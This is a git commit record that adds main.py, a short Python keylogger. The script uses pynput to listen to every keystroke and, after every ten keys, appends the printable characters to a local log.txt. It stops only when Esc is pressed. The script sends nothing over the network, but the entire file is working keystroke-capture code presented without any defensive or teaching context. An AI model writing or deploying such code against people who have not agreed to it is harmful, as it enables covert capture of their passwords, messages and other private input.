055a5e803e4ba317ec127482b22685ed2f16e305
Akash Uniyal <uniyalakash25@gmail.com>
2022-07-29 13:45:23 +0530

    First commit

---
+++ main.py
@@ -0,0 +1,33 @@
+import pynput
+from pynput.keyboard import Key, Listener
+
+count = 0
+keys = []
+
+def on_press(key):
+    global keys, count
+    '''print("{0} pressed".format(key))'''
+    keys.append(key)
+    count += 1
+
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = []
+
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
